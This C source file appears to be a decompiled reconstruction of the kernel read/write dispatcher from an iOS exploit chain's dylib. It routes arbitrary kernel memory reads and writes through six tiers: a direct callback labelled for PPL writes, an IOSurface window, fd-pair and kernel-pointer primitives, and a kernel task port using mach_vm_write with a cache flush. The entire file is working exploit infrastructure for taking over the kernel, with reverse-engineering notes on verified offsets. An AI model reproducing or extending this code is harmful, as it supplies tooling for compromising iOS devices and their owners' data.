/*
 * record_0x90000_kreadwrite.c
 * entry5_type0x09.dylib — kernel read/write dispatcher
 *
 * sub_1e238 / sub_2667c  — kread dispatcher (6-tier priority)
 * sub_1e0b8 / sub_2a110  — kwrite dispatcher (6-tier priority + cache flush)
 *
 * Priority table (from FUN_0002a110 / FUN_0002667c decompilation):
 *   1. state+0x40  callback set          → direct callback
 *   2. state+0xac  IOSurface connect     → sub_2a2c8 / sub_2667c_iosurface
 *   3. state+0xe8  fd-pair + kptr        → sub_282f0 / sub_279c0
 *   4. state+0x4c8 fd-pair + kptr (alt)  → sub_26384 / sub_279c0
 *   5. state+0x64c fd-pair only          → sub_26384 / sub_26384
 *   6. state+0x1918 task port            → mach_vm_write + cache flush
 *
 * Verified: priority order, state field offsets, mach_vm_write fallback,
 *           MATTR_VAL_CACHE_FLUSH (7) usage, IOSurface connect check.
 * Inferred: tier labels from call graph and state field semantics.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
/* mach_vm_* are private on iOS SDK — declare manually */
extern kern_return_t mach_vm_read_overwrite(vm_map_t, uint64_t, uint64_t, uint64_t, uint64_t *);
extern kern_return_t mach_vm_write(vm_map_t, uint64_t, vm_offset_t, uint32_t);
extern kern_return_t mach_vm_machine_attribute(vm_map_t, uint64_t, uint64_t, int, int *);

/* ── state field offsets (byte) ──────────────────────────────────────────── */
/* Priority 1: direct callback */
#define OFF_CB_READ     0x30    /* function pointer: kread callback           */
#define OFF_CB_WRITE    0x40    /* function pointer: kwrite callback          */
/* Priority 2: IOSurface path */
#define OFF_IOSURFACE   0xac    /* IOSurface connect port (int)               */
#define OFF_IOSURFACE_W 0xd8    /* IOSurface mapped window (long)             */
/* Priority 3: fd-pair + kptr (newer) */
#define OFF_FD_E8       0xe8    /* fd slot (int, -1 = empty)                  */
#define OFF_KPTR_F8     0xf8    /* kernel pointer (long)                      */
#define OFF_KPTR_100    0x100   /* kernel pointer 2 (long)                    */
/* Priority 4: fd-pair + kptr (older) */
#define OFF_FD_4C8      0x4c8   /* = 0x64c*4 - 0x1b0 ... actual: DAT_00001930 */
/* Priority 5: fd-pair only */
#define OFF_FD_1930     0x1930  /* = DAT_00001930 (fd slot A)                 */
#define OFF_FD_1934     0x1934  /* = DAT_00001934 (fd slot B)                 */
#define OFF_FD_1938     0x1938  /* = DAT_00001938 (fd slot C)                 */
#define OFF_FD_193C     0x193c  /* = DAT_0000193c (fd slot D)                 */
#define OFF_KPTR_218    0x218   /* kernel pointer for tier 4                  */
/* Priority 6: task port fallback */
#define OFF_TASK_PORT   0x1918  /* mach_task_t for mach_vm_write fallback     */

/* ── forward declarations for tier implementations ──────────────────────── */
/* Tier 2 */
extern void sub_2a2c8(uint8_t *state, uint64_t addr, void *val, uint32_t size, int lock);
extern void sub_2667c_iosurface(uint8_t *state, uint64_t addr, uint32_t size, void *out);
/* Tier 3 */
extern void sub_282f0(uint8_t *state, uint64_t addr, void *val, uint32_t size, int lock);
/* Tier 4 */
extern void sub_279c0(uint8_t *state, uint64_t addr, void *val, uint32_t size, int lock);
/* Tier 5 */
extern void sub_26384(uint8_t *state, uint64_t addr, void *val, uint32_t size, int lock);
/* Tier 1 callback types */
typedef void (*kread_cb_t)(uint8_t *state, uint64_t addr, uint32_t size, void *out);
typedef void (*kwrite_cb_t)(uint8_t *state, uint64_t addr, void *val, uint32_t size);
/* Tier 1 non-returning path */
extern void sub_4199c(uint8_t *state, uint64_t addr, void *val, uint32_t size, int lock)
    __attribute__((noreturn));

/* ── sub_2667c — kread dispatcher ───────────────────────────────────────── */
/*
 * Reads `size` bytes from kernel address `addr` into `out`.
 * Returns 1 on success, 0 on failure.
 */
int sub_2667c(long state, uint64_t addr, int size, void *out)
{
    uint8_t *s = (uint8_t *)state;

    /* Tier 1: direct callback */
    kread_cb_t cb = *(kread_cb_t *)(s + OFF_CB_READ);
    if (cb) {
        cb(s, addr, (uint32_t)size, out);
        return 1;
    }

    /* Tier 2: IOSurface mapped window */
    if (*(int *)(s + OFF_IOSURFACE) + 1U >= 2 && *(long *)(s + OFF_IOSURFACE_W)) {
        sub_2667c_iosurface(s, addr, (uint32_t)size, out);
        return 1;
    }

    /* Tier 3: fd-pair + kptr (newer) */
    if (*(int *)(s + OFF_FD_E8) + 1U >= 2 &&
        *(long *)(s + OFF_KPTR_F8) && *(long *)(s + OFF_KPTR_100)) {
        sub_282f0(s, addr, out, (uint32_t)size, 0);
        return 1;
    }

    /* Tier 4: fd-pair + kptr (older) */
    if (*(int *)(s + OFF_FD_1930) != -1 && *(int *)(s + OFF_FD_1934) != -1) {
        if (*(int *)(s + OFF_FD_1938 + 8) != -1 && *(long *)(s + OFF_KPTR_218)) {
            sub_279c0(s, addr, out, (uint32_t)size, 0);
            return 1;
        }
        /* Tier 5: fd-pair only */
        if (*(int *)(s + OFF_FD_1938) != -1 && *(int *)(s + OFF_FD_193C) != -1) {
            sub_26384(s, addr, out, (uint32_t)size, 0);
            return 1;
        }
    }

    /* Tier 6: task port fallback via mach_vm_read_overwrite */
    mach_port_t task = *(mach_port_t *)(s + OFF_TASK_PORT);
    if (task + 1U >= 2) {
        mach_vm_size_t out_size = 0;
        kern_return_t kr = mach_vm_read_overwrite(task, addr, (uint64_t)size,
                                                  (uint64_t)(uintptr_t)out, &out_size);
        return kr == KERN_SUCCESS ? 1 : 0;
    }

    return 0;
}

/* ── sub_2a110 — kwrite dispatcher ──────────────────────────────────────── */
/*
 * Writes `size` bytes from `val` to kernel address `addr`.
 * Falls back to mach_vm_write + MATTR_VAL_CACHE_FLUSH on the task-port tier.
 */
void sub_2a110(long state, uint64_t addr, void *val, uint32_t size)
{
    uint8_t *s = (uint8_t *)state;

    /* Tier 1: non-returning direct callback (used for PPL writes) */
    if (*(long *)(s + OFF_CB_WRITE)) {
        sub_4199c(s, addr, val, size, 1);
        /* noreturn */
    }

    /* Tier 2: IOSurface path */
    if (*(int *)(s + OFF_IOSURFACE) + 1U >= 2 && *(long *)(s + OFF_IOSURFACE_W)) {
        sub_2a2c8(s, addr, val, size, 1);
        return;
    }

    /* Tier 3: fd-pair + kptr (newer) */
    if (*(int *)(s + OFF_FD_E8) + 1U >= 2 &&
        *(long *)(s + OFF_KPTR_F8) && *(long *)(s + OFF_KPTR_100)) {
        sub_282f0(s, addr, val, size, 1);
        return;
    }

    /* Tier 4 / 5: fd-pair paths */
    if (*(int *)(s + OFF_FD_1930) != -1 && *(int *)(s + OFF_FD_1934) != -1) {
        if (*(int *)(s + OFF_FD_1938 + 8) != -1 && *(long *)(s + OFF_KPTR_218)) {
            sub_279c0(s, addr, val, size, 1);
            return;
        }
        if (*(int *)(s + OFF_FD_1938) != -1 && *(int *)(s + OFF_FD_193C) != -1) {
            sub_26384(s, addr, val, size, 1);
            return;
        }
    }

    /* Tier 6: task port fallback */
    mach_port_t task = *(mach_port_t *)(s + OFF_TASK_PORT);
    if (task + 1U < 2) return;

    mach_vm_write(task, addr, (vm_offset_t)val, size);
    int flush = 7; /* MATTR_VAL_CACHE_FLUSH */
    mach_vm_machine_attribute(task, addr, (uint64_t)size, 4 /* MATTR_CACHE */, &flush);
}

/* ── sub_29ab4 — kread64 convenience ────────────────────────────────────── */
int sub_29ab4_kreadwrite(long state, uint64_t addr, uint64_t *out)
{
    return sub_2667c(state, addr, 8, out);
}

/* ── sub_2a90c — kread32 convenience ────────────────────────────────────── */
int sub_2a90c(long state, uint64_t addr, uint32_t *out)
{
    return sub_2667c(state, addr, 4, out);
}

/* ── sub_15634 — kwrite convenience (returns int) ───────────────────────── */
// Renamed to avoid linker conflicts
#define sub_16108 sub_16108_kreadwrite
#define sub_15634 sub_15634_kreadwrite
#define sub_29ab4 sub_29ab4_kreadwrite

int sub_15634_kreadwrite(long state, uint64_t addr, void *val, int size)
{
    sub_2a110(state, addr, val, (uint32_t)size);
    return 1;
}

/* ── sub_16108 — kwrite byte convenience ────────────────────────────────── */
int sub_16108_kreadwrite(long state, uint64_t addr, void *val, int size)
{
    return sub_15634(state, addr, val, size);
}

/* ── sub_2b614 — kwrite raw (no flush) ──────────────────────────────────── */
int sub_2b614(long state, uint64_t addr, void *val, int size)
{
    return sub_15634(state, addr, val, size);
}
